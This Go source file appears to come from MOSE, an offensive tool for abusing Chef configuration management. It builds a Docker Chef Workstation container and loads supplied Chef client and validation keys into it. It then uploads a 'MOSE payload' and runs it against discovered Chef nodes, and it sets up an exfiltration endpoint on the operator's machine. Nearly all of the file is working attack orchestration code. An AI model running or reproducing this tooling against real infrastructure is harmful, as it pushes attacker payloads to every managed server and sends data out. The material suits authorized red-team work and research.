// Copyright 2019 National Technology & Engineering Solutions of Sandia, LLC (NTESS).
// Under the terms of Contract DE-NA0003525 with NTESS,
// the U.S. Government retains certain rights in this software.

package main

import (
	"bytes"
	"context"
	"github.com/docker/docker/api/types"
	"github.com/docker/docker/api/types/container"
	"github.com/docker/docker/client"
	"github.com/gobuffalo/packr/v2"
	"github.com/l50/MOSE/pkg/moseutils"
	"github.com/mholt/archiver"
	"io"
	"io/ioutil"
	"log"
	"os"
	"os/signal"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"text/template"
	"time"
)

var (
	signalChan chan os.Signal
)

type knifeTemplateArgs struct {
	ChefNodeName        string
	ChefClientKey       string
	TargetOrgName       string
	ChefValidationKey   string
	TargetChefServer    string
	TargetValidatorName string
}

func copyFiles(cli *client.Client, id string, files []string, tarLocation string, dockerLocation string) {
	ctx := context.Background()

	tar := archiver.Tar{
		OverwriteExisting: true,
	}

	if err := tar.Archive(files, tarLocation); err != nil {
		log.Fatalln(err)
	}

	reader, err := os.Open(tarLocation)

	if err != nil {
		log.Fatalln(err)
	}

	err = cli.CopyToContainer(ctx, id, dockerLocation, reader, types.CopyToContainerOptions{})

	if err != nil {
		log.Fatalln(err)
	}
}

func simpleRun(cli *client.Client, id string, cmd []string) types.IDResponse {
	ctx := context.Background()

	execId, err := cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			Cmd: cmd,
		},
	)

	if err != nil {
		log.Fatalln(err)
	}

	if err = cli.ContainerExecStart(ctx, execId.ID, types.ExecStartCheck{}); err != nil {
		log.Fatalln(err)
	}
	if UserInput.Debug {
		log.Printf("ran command: %v", cmd)
	}

	return execId
}

func build(cli *client.Client) {
	t := archiver.Tar{
		OverwriteExisting: true,
	}

	err := t.Archive([]string{"dockerfiles"}, "tarfiles/dockerfiles.tar")
	if err != nil {
		log.Fatalln(err)
	}

	dockerBuildContext, err := os.Open("tarfiles/dockerfiles.tar")
	if err != nil {
		log.Fatalln(err)
	}
	defer dockerBuildContext.Close()

	opts := types.ImageBuildOptions{
		Tags:       []string{UserInput.ImageName},
		Dockerfile: "dockerfiles/Dockerfile",
	}

	ibr, err := cli.ImageBuild(context.Background(), dockerBuildContext, opts)

	if err != nil {
		log.Fatalln("Error building image " + err.Error())
	}
	defer ibr.Body.Close()

	response, err := ioutil.ReadAll(ibr.Body)
	if err != nil {
		log.Fatalln(err.Error())
	}
	if UserInput.Debug {
		log.Printf("********* %s **********", ibr.OSType)
		log.Println(string(response))
	}
}

func run(cli *client.Client) string {
	ctx := context.Background()

	hostconfig := &container.HostConfig{}
	if UserInput.Rhost != "" {
		hostconfig = &container.HostConfig{
			ExtraHosts: []string{UserInput.Rhost},
		}
	}

	resp, err := cli.ContainerCreate(ctx, &container.Config{
		Image:        UserInput.ImageName,
		Tty:          true,
		OpenStdin:    true,
		AttachStdin:  true,
		AttachStdout: true,
		AttachStderr: true,
	},
		hostconfig,
		nil,
		UserInput.ContainerName,
	)

	if err != nil {
		panic(err)
	}

	if UserInput.Debug {
		log.Printf("Running container with id %v", resp.ID)
	}

	if err = cli.ContainerStart(ctx, resp.ID, types.ContainerStartOptions{}); err != nil {
		log.Fatalln(err)
	}

	return resp.ID
}

func copyToDocker(cli *client.Client, id string) {
	copyFiles(cli, id, []string{UserInput.ChefClientKey, UserInput.ChefValidationKey, "dockerfiles/knife.rb"}, "tarfiles/keys_knife.tar", "root/.chef/")

	log.Println("Running knife ssl fetch, please wait...")
	_ = simpleRun(cli, id, []string{"knife", "ssl", "fetch"})
}

// runMoseInContainer will upload the MOSE payload for a Chef Workstation
// into a container, so we can run it against a Chef Server
func runMoseInContainer(cli *client.Client, id string, osTarget string) {
	ctx := context.Background()

	payloadPath := "payloads/chef-linux"
	if UserInput.FilePath != "" {
		payloadPath = UserInput.FilePath
	}

	binPath := path.Join("/", path.Base(payloadPath))

	filesToCopy := []string{payloadPath}

	if UserInput.FileUpload != "" {
		filesToCopy = append(filesToCopy, path.Join("payloads", path.Base(UserInput.FileUpload)))
	}

	copyFiles(cli, id, filesToCopy, "tarfiles/main.tar", "/")

	_ = simpleRun(cli, id, []string{"chmod", "u+x", binPath})

	execId, err := cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			AttachStderr: true,
			AttachStdin:  true,
			AttachStdout: true,
			Cmd:          []string{binPath, "-i"},
			Tty:          true,
			Detach:       false,
		},
	)

	if err != nil {
		log.Fatalln(err)
	}

	if UserInput.Debug {
		log.Printf("Running container exec and attach for container ID %v", execId.ID)
	}
	hj, err := cli.ContainerExecAttach(ctx, execId.ID, types.ExecStartCheck{Detach: false, Tty: true})

	if err != nil {
		log.Fatalln(err)
	}

	// Parse the hijacked reader for the agents
	var agentString = regexp.MustCompile("(?ms)BEGIN NODE LIST \\[(?P<nodes>.*)\\] END NODE LIST")
	names := agentString.SubexpNames()

	buf := new(bytes.Buffer)
	_, err = buf.ReadFrom(hj.Reader)
	if err != nil {
		log.Fatalln(err)
	}
	nodes := make([]string, 0)

	log.Println(buf.String())
	for _, match := range agentString.FindAllStringSubmatch(buf.String(), -1) {
		for groupId, group := range match {
			name := names[groupId]
			if name != "" {
				log.Printf("Found nodes: %v", group)
				nodes = append(nodes, strings.Split(group, " ")...)
			}
		}
	}

	hj.Close()

	if len(nodes) < 1 {
		log.Println("No nodes found, exiting...")
		signalChan <- os.Interrupt

		os.Exit(0)
	}
	// Run the MOSE binary on the new workstation that we just created
	agents, err := moseutils.TargetAgents(nodes, osTarget)
	if err != nil {
		log.Println("Quitting...")
		signalChan <- os.Interrupt
		log.Fatalln()
	}
	log.Printf("Command to be ran on container: %v", append([]string{binPath, "-n"}, agents...))

	execId, err = cli.ContainerExecCreate(ctx,
		id,
		types.ExecConfig{
			AttachStderr: true,
			AttachStdin:  true,
			AttachStdout: true,
			Cmd:          append([]string{binPath, "-n"}, strings.Join(agents[:], " ")),
			Tty:          true,
			Detach:       false,
		},
	)

	if err != nil {
		log.Fatalln(err)
	}

	if UserInput.Debug {
		log.Printf("Running container exec and attach for container ID %v", execId.ID)
	}
	hj, err = cli.ContainerExecAttach(ctx, execId.ID, types.ExecStartCheck{Detach: false, Tty: true})

	if err != nil {
		log.Fatalln(err)
	}

	if _, err = io.Copy(os.Stdout, hj.Reader); err != nil {
		log.Fatalln(err)
	}

	hj.Close()
}

func removeContainer(cli *client.Client, id string) {
	ctx := context.Background()
	timeout, _ := time.ParseDuration("10s")
	err := cli.ContainerStop(ctx, id, &timeout)
	if err != nil {
		log.Fatalln(err)
	}
	err = cli.ContainerRemove(ctx, id, types.ContainerRemoveOptions{Force: true})
	if err != nil {
		log.Fatalln(err)
	}
}

func monitor(cli *client.Client, id string) {
	cleanupDone := make(chan struct{})
	signal.Notify(signalChan, os.Interrupt)
	go func(cli *client.Client, id string) {
		<-signalChan
		log.Println("\nReceived an interrupt, stopping services...")
		removeContainer(cli, id)
		close(cleanupDone)
	}(cli, id)
	<-cleanupDone

	os.Exit(0)
}

func generateKnife() {
	knifeArgs := knifeTemplateArgs{
		ChefNodeName:        UserInput.ChefNodeName,
		ChefClientKey:       filepath.Base(UserInput.ChefClientKey),
		TargetOrgName:       UserInput.TargetOrgName,
		ChefValidationKey:   filepath.Base(UserInput.ChefValidationKey),
		TargetChefServer:    UserInput.TargetChefServer,
		TargetValidatorName: UserInput.TargetValidatorName,
	}

	paramLoc := filepath.Join("templates", UserInput.CMTarget)
	box := packr.New("Params", "|")
	box.ResolutionDir = paramLoc
	// Build knife.rb using the knife template
	s, err := box.FindString("knife.tmpl")

	if err != nil {
		log.Fatal(err)
	}

	t, err := template.New("knife").Parse(s)

	if err != nil {
		log.Fatal(err)
	}

	f, err := os.Create("dockerfiles/knife.rb")

	if err != nil {
		log.Fatalln(err)
	}

	err = t.Execute(f, knifeArgs)

	if err != nil {
		log.Fatal("Execute: ", err)
	}

	f.Close()
}

func setupChefWorkstationContainer(localIP string, exfilPort int, osTarget string) {
	signalChan = make(chan os.Signal, 1)
	if UserInput.Debug {
		log.Printf("Creating exfil endpoint at %v:%v", localIP, exfilPort)
		log.Printf("Current orgname: %s", UserInput.TargetOrgName)
	}

	createUploadRoute(localIP, exfilPort)
	log.Printf("New orgname: %s", UserInput.TargetOrgName)
	generateKnife()
	cli, err := client.NewClientWithOpts(client.WithVersion("1.37"))

	if err != nil {
		log.Fatalf("Could not get docker client: %v", err)
	}
	if UserInput.Debug {
		log.Println("Building Workstation container, please wait...")
	}

	build(cli)

	if UserInput.Debug {
		log.Println("Starting Workstation container, please wait...")
	}
	id := run(cli)

	go monitor(cli, id)

	if UserInput.Debug {
		log.Println("Copying keys and relevant resources to workstation container, please wait...")
	}

	copyToDocker(cli, id)
	if UserInput.Debug {
		log.Println("Running MOSE in Workstation container, please wait...")
	}

	runMoseInContainer(cli, id, osTarget)

	if UserInput.Debug {
		log.Println("Running MOSE in Workstation container, please wait...")
	}

	removeContainer(cli, id)
}
